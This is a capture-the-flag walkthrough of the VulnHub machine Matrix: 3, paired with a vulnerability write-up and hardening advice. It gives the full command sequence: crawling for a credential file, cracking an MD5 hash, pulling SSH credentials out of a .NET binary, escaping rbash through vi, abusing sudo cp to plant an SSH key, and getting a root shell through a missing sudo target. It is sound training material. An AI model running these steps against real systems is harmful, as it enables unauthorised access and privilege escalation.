# Matrix: 3 CTF Walkthrough

**Target:** Matrix: 3  
**Source:** [VulnHub](https://www.vulnhub.com/entry/matrix-3,326/)  
**Difficulty:** Intermediate  
**Target IP:** 10.0.2.26  

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration — Port 80](#web-enumeration--port-80)
- [Directory Crawling — Finding the Secret](#directory-crawling--finding-the-secret)
- [Credential Discovery & Hash Cracking](#credential-discovery--hash-cracking)
- [Authenticated Enumeration — Port 7331](#authenticated-enumeration--port-7331)
- [Binary Analysis — Mono/.NET Executable](#binary-analysis--mononet-executable)
- [Initial Access — SSH & Restricted Shell Escape](#initial-access--ssh--restricted-shell-escape)
- [Privilege Escalation — guest → trinity](#privilege-escalation--guest--trinity)
- [Privilege Escalation — trinity → root](#privilege-escalation--trinity--root)
- [Root Flag](#root-flag)
- [Vulnerabilities](#vulnerabilities)
- [Recommendations](#recommendations)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Matrix: 3 is the third entry in the boot2root Matrix series on VulnHub. The attack path requires deep directory crawling to discover a hidden credential file, MD5 hash cracking, analysis of a .NET binary to extract embedded SSH credentials, escaping a restricted bash shell, and a two-stage privilege escalation chain: lateral movement from `guest` to `trinity` via a `sudo`-permitted `cp` abuse, then from `trinity` to `root` by creating a missing SUID-permitted script.

**Key Skills Required:**
- Full-range port enumeration
- Recursive web directory crawling
- MD5 hash identification and cracking
- .NET/Mono binary disassembly with `monodis`
- Restricted shell (`rbash`) escape via `vi`
- Linux privilege escalation via `sudo cp` and writable sudo target

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -sC -Pn -p- 10.0.2.26
```

As with the previous Matrix challenges, `-p-` (all 65,535 ports) is essential — services run on non-standard ports.

**Results:**

| Port | State | Service | Version / Notes |
|------|-------|---------|-----------------|
| 80/tcp | open | http | SimpleHTTPServer 0.6 (Python 2.7.14) — "Welcome in Matrix" |
| 6464/tcp | open | ssh | OpenSSH 7.7 (protocol 2.0) |
| 7331/tcp | open | http | SimpleHTTPServer 0.6 — **401 Unauthorized** |

**Key Observations:**
- Port 80 serves a static landing page via Python's SimpleHTTPServer.
- Port 6464 is SSH running on a non-default port — a login target once credentials are obtained.
- Port 7331 immediately presents HTTP Basic Auth — credentials are required before any further enumeration.

---

## Web Enumeration — Port 80

### Directory Brute-Force

```bash
ffuf -u http://10.0.2.26/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
assets      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
Matrix      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
```

Two directories found. `/assets` is unremarkable. `/Matrix` contains a deeply nested tree of subdirectories — too many to enumerate manually with a standard wordlist.

---

## Directory Crawling — Finding the Secret

The `/Matrix` directory tree is intentionally deep and requires recursive crawling rather than a flat wordlist scan. A custom Python crawler is the efficient approach here:

```bash
python3 crawler.py http://10.0.2.26/Matrix
```

```
[FILE] http://10.0.2.26/Matrix/n/e/o/6/4/secret.gz  (type: application/octet-stream, size: 39)
```

The crawler discovers `secret.gz` buried at `Matrix/n/e/o/6/4/` — the path itself spells out "neo64", a thematic hint consistent with the Matrix series.

```bash
file secret.gz
# secret.gz: ASCII text

cat secret.gz
# admin:76a2173be6393254e72ffa4d6df1030a
```

Despite the `.gz` extension, the file contains plain ASCII text: a username and hash.

---

## Credential Discovery & Hash Cracking

### Identifying the Hash

```bash
hash-identifier
# HASH: 76a2173be6393254e72ffa4d6df1030a
#
# Possible Hashs:
# [+] MD5
# [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

The hash is MD5. Unlike the Apache `$apr1$` format encountered in Matrix: 2, this is a plain MD5 — trivially reversible online or via John.

```
76a2173be6393254e72ffa4d6df1030a → passwd
```

**Credentials recovered:**
- Username: `admin`
- Password: `passwd`

---

## Authenticated Enumeration — Port 7331

With credentials in hand, port 7331 can now be explored.

### robots.txt

```bash
curl -u admin:passwd http://10.0.2.26:7331/robots.txt
```

```
User-agent: *
Disallow: /data/
```

### Downloading the Binary

`robots.txt` discloses a `/data/` path. Enumerating it reveals a file named `data`:

```bash
curl -u admin:passwd http://10.0.2.26:7331/data/data -O
```

```bash
file data
# data: PE32 executable for MS Windows 6.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
```

The file is a .NET/Mono executable — not a Linux binary. Standard tools like `strings` will yield partial results; a proper Mono disassembler is required.

---

## Binary Analysis — Mono/.NET Executable

### Disassembling with monodis

`monodis` (the Mono Disassembler) decompiles .NET assemblies into human-readable IL (Intermediate Language):

```bash
monodis data 2>&1 --output=data.txt
```

### Extracting SSH Credentials

Scanning the disassembled output for the string `guest` (a likely username given the Matrix theme):

```bash
grep guest data.txt
```

```
IL_028c:  ldstr "guest:7R1n17yN30"
```

The binary has SSH credentials hardcoded as a string literal in the IL code — a classic developer mistake.

**Credentials found:**
- Username: `guest`
- Password: `7R1n17yN30`

The password `7R1n17yN30` is a leet-speak encoding of "Trinity Neo" — thematically consistent with the series.

---

## Initial Access — SSH & Restricted Shell Escape

### Connecting via SSH

Note that SSH runs on port **6464**, not the default 22:

```bash
ssh guest@10.0.2.26 -p 6464
```

```
guest@matrix:~$ whoami
-rbash: whoami: command not found

guest@matrix:~$ echo $PATH
/home/guest/prog
```

The shell is `rbash` (restricted bash) — command execution is limited to binaries inside `/home/guest/prog`. Listing what is available:

```bash
echo /home/guest/prog/*
# /home/guest/prog/vi
```

Only `vi` is permitted.

### Escaping rbash via vi

`vi` can spawn a shell from within the editor using its built-in command execution:

```
vi
:!/bin/sh
```

This drops into an unrestricted `sh` session:

```
sh-4.4$
```

### Fixing the Environment

The `PATH` still only contains `/home/guest/prog`, so common commands are not found. Export a usable PATH and shell:

```bash
export PATH=/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
```

Standard commands (`ls`, `id`, `sudo`, etc.) are now available.

```bash
whoami
# guest
```

---

## Privilege Escalation — guest → trinity

### Checking sudo Permissions

```bash
sudo -l
```

```
User guest may run the following commands on matrix:
    (root)    NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

Two entries of interest:
- `guest` can run `xfsm-shutdown-helper` as root — not directly useful for a shell.
- `guest` can run `/bin/cp` **as trinity** without a password. This is the escalation path.

### Abusing sudo cp to Write to trinity's authorized_keys

The plan: generate an SSH key pair as `guest`, then use `sudo -u trinity /bin/cp` to copy our public key into trinity's `~/.ssh/authorized_keys`, granting passwordless SSH access as trinity.

```bash
ssh-keygen        # accept all defaults; keys land in ~/.ssh/
cd ~/.ssh
chmod 777 id_rsa.pub                # cp as trinity needs to read this
cp id_rsa.pub /home/guest/          # stage from home directory
cd /home/guest
sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
```

### Logging in as trinity

```bash
ssh trinity@127.0.0.1 -i ~/.ssh/id_rsa -p 6464
```

```
trinity@matrix:~$ whoami
trinity
```

Lateral movement to trinity is complete.

---

## Privilege Escalation — trinity → root

### Checking sudo Permissions

```bash
sudo -l
```

```
User trinity may run the following commands on matrix:
    (root) NOPASSWD: /home/trinity/oracle
```

Trinity can run `/home/trinity/oracle` as root with no password. Checking whether this file exists:

```bash
ls /home/trinity/
# Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/
```

The `oracle` binary does not exist. Because trinity owns her own home directory, she can create it.

### Creating the oracle Script

```bash
echo "/bin/sh" > oracle
chmod +x oracle
sudo ./oracle
```

```
sh-4.4# whoami
root
```

By writing `/bin/sh` into the expected path and making it executable, `sudo` runs it as root — granting an immediate root shell.

---

## Root Flag

```bash
cd /root
cat flag.txt
```

```
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  Matrix is      |  |  |     |         |      |
     |  |  compromised    |  |  |/----|`---=    |      |
     |  |  C:\>_reload    |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"     -morpheus AKA (unknowndevice64)-
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'

-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-
```

**PWNED!**

> **Bonus tip:** To bypass `rbash` entirely and land directly in a full bash session, append `-t "bash --noprofile"` to the SSH command:
> ```bash
> ssh guest@10.0.2.26 -p 6464 -t "bash --noprofile"
> ```

---

## Vulnerabilities

### 1. Credentials Embedded in a Publicly Accessible File — secret.gz (High)

**Description:** A file containing a username and MD5-hashed password (`admin:76a2173be6393254e72ffa4d6df1030a`) was stored inside a deeply nested but unauthenticated directory tree on port 80. While obscurity through nesting slows casual browsing, automated crawlers trivially discover it.

**Impact:** Any attacker who ran a recursive crawler against `/Matrix` obtained valid credentials for the authenticated port 7331 service.

**Mitigation:**
- Never store credential files within the web root, regardless of directory depth
- Obscurity through path complexity is not a security control
- Require authentication on all endpoints that serve sensitive data

---

### 2. Weak MD5 Password Hash (High)

**Description:** The password for `admin` was hashed using plain MD5 — a fast, cryptographically weak algorithm — and the plaintext (`passwd`) is an extremely common password present in every major wordlist.

**Impact:** The hash was reversed instantly using a public MD5 lookup tool, requiring no computational effort whatsoever.

**Mitigation:**
- Use modern, slow hashing algorithms: bcrypt, scrypt, or Argon2
- Enforce a strong password policy; reject passwords present in common wordlists
- Plain MD5 (without salt) should never be used for password storage

---

### 3. Credentials Hardcoded in a .NET Binary (High)

**Description:** SSH credentials (`guest:7R1n17yN30`) were hardcoded as a string literal inside a .NET executable distributed via the web server. Any user who downloaded and disassembled the binary with `monodis` could trivially extract them.

**Impact:** Direct SSH access to the system was obtained with a single `grep` against the disassembled output.

**Mitigation:**
- Never hardcode credentials in application binaries or source code
- Use environment variables or a secrets manager at runtime
- Treat any distributed binary as fully reversible — hardcoded secrets are equivalent to plaintext

---

### 4. Restricted Shell Bypass via Permitted Binary — vi (Medium)

**Description:** The `guest` account was placed in a restricted bash (`rbash`) environment with only `/home/guest/prog` in `PATH`. However, `vi` was included in the permitted binaries. Since `vi` can execute arbitrary shell commands via `:!/bin/sh`, the restriction was trivially bypassed.

**Impact:** An attacker with SSH access as `guest` could immediately escape the restricted environment and gain a full shell.

**Mitigation:**
- Never include editors (`vi`, `vim`, `nano`, `less`, `more`, `awk`, etc.) in a restricted shell's permitted binary list — all of them support shell escape
- Consider using more robust sandboxing (e.g. `chroot`, containers, or SSH `ForceCommand`) rather than `rbash`
- Verify all permitted binaries against [GTFOBins](https://gtfobins.github.io/) before deployment

---

### 5. Privilege Escalation via sudo cp — guest → trinity (High)

**Description:** The `guest` account was permitted to run `/bin/cp` as `trinity` without a password. Because `cp` can write to any path writable by the target user, an attacker could overwrite `trinity`'s `~/.ssh/authorized_keys` with their own public key and gain SSH access as `trinity`.

**Impact:** Full lateral movement from `guest` to `trinity` with no password or interaction from the `trinity` account required.

**Mitigation:**
- Never grant `sudo` permission for file copy utilities (`cp`, `mv`, `rsync`, `scp`) — they allow arbitrary file writes as the target user
- Apply the principle of least privilege; audit all `sudo` rules for unintended write paths
- Verify all `sudo`-permitted commands against [GTFOBins](https://gtfobins.github.io/)

---

### 6. Privilege Escalation via Missing sudo Target — trinity → root (Critical)

**Description:** The `trinity` account was permitted to run `/home/trinity/oracle` as root. The file did not exist, and `trinity` owned her own home directory. This allowed `trinity` to create `oracle` with arbitrary content — in this case, `/bin/sh` — and execute it as root.

**Impact:** Immediate, unrestricted root shell with a single `echo` and `sudo` command.

**Mitigation:**
- Verify that all files referenced in `sudo` rules exist before deployment and are owned by root
- Ensure that the directory containing any `sudo`-permitted binary is not writable by the permitted user
- Regularly audit `/etc/sudoers` and `/etc/sudoers.d/` for rules referencing writable or non-existent paths

---

## Recommendations

### Web Application & Secret Management

- Never place credential or configuration files inside the web root, regardless of directory depth
- Serve sensitive files only over authenticated endpoints with proper access controls
- Use a dedicated secrets manager (e.g. HashiCorp Vault) for all credentials and API keys
- Never embed credentials in distributed binaries or application code

### Password Security

- Enforce strong, unique passwords; reject entries present in common wordlists
- Use bcrypt, scrypt, or Argon2 for all password hashing — never plain MD5 or SHA-1
- Rotate credentials regularly and audit for reuse across services

### SSH & Shell Hardening

- Run SSH on a non-default port and restrict access via firewall rules or VPN
- Validate all `rbash` permitted binaries against GTFOBins; exclude any tool capable of spawning a shell or executing arbitrary commands
- Prefer `ForceCommand` or containerised shells over `rbash` for restricted access scenarios

### sudo Hardening

- Audit all `sudo` rules with `visudo`; apply the principle of least privilege
- Never permit file-manipulation utilities (`cp`, `mv`, `rsync`) as sudo targets
- Ensure all files referenced in sudo rules exist, are owned by root, and reside in directories not writable by the permitted user
- Use `sudo` with explicit argument restrictions where possible (e.g. `NOPASSWD: /usr/bin/somecommand specificarg`)

### Defense in Depth

- Implement network-level segmentation to limit access to internal services
- Enable and configure fail2ban or equivalent on all externally reachable services
- Centralise logging (web access, auth events, sudo usage, shell activity) and alert on anomalous behaviour

---

## Attack Chain Summary

```
Nmap Full Port Scan (-p-) → Ports 80, 6464 (SSH), 7331
        ↓
Port 80 — ffuf directory brute-force → /Matrix (deeply nested tree)
        ↓
Python recursive crawler → /Matrix/n/e/o/6/4/secret.gz
        ↓
secret.gz → admin:76a2173be6393254e72ffa4d6df1030a (plain MD5)
        ↓
MD5 lookup → admin:passwd
        ↓
Login to port 7331 → robots.txt discloses /data/
        ↓
Download /data/data → PE32 Mono/.NET executable
        ↓
monodis data → grep guest → guest:7R1n17yN30 (hardcoded credential)
        ↓
SSH guest@10.0.2.26 -p 6464 → rbash restricted shell
        ↓
vi → :!/bin/sh → rbash escape → full shell as guest
        ↓
sudo -l → (trinity) NOPASSWD: /bin/cp
        ↓
ssh-keygen → sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
        ↓
SSH trinity@127.0.0.1 -i id_rsa -p 6464 → shell as trinity
        ↓
sudo -l → (root) NOPASSWD: /home/trinity/oracle (file does not exist)
        ↓
echo "/bin/sh" > oracle && chmod +x oracle && sudo ./oracle → Root Shell
        ↓
cat /root/flag.txt — SYSTEM PWNED
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Full-range network & service scanning (`-p-`) |
| ffuf | Web directory brute-force enumeration |
| Python crawler | Recursive directory traversal of `/Matrix` |
| hash-identifier | MD5 hash type identification |
| MD5 lookup / John | Hash cracking / reversal |
| curl | HTTP file retrieval with Basic Auth |
| monodis | Mono/.NET assembly disassembly |
| vi | GTFOBins-style rbash escape |
| ssh-keygen | SSH key pair generation for lateral movement |
| SSH | Remote access on non-standard port 6464 |

---

## References

- [VulnHub - Matrix: 3](https://www.vulnhub.com/entry/matrix-3,326/)
- [GTFOBins - vi](https://gtfobins.github.io/gtfobins/vi/)
- [GTFOBins - cp](https://gtfobins.github.io/gtfobins/cp/)
- [Mono Disassembler (monodis)](https://www.mono-project.com/docs/tools+libraries/tools/monodis/)
- [hash-identifier](https://github.com/blackploit/hash-identifier)

---

## Disclaimer

This writeup is for **educational purposes only**. All techniques demonstrated should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

---
*"-[ 7h!5 !5 n07 7h3 3nd, m47r!x w!11 r37urn ]-"*
